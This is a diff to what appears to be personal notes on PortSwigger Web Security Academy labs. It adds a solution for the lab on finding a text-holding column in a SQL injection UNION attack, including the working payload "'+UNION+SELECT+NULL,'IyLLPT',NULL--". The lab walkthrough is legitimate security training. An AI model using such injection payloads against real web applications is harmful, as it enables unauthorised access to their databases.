@@ -42,7 +42,10 @@
 [4.Lab: SQL injection UNION attack, finding a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
 
 1. *Solutions*
-   1. 
+   >The server responed for `'+UNION+SELECT+NULL,'xyz',NULL--` that is mean the second column containing text.
+   >Make the database retrieve the string: 'IyLLPT' #Noted in the top of the screen,it can be diffrent in your case
+   
+   1. `'+UNION+SELECT+NULL,'IyLLPT',NULL-- `
 
 
 
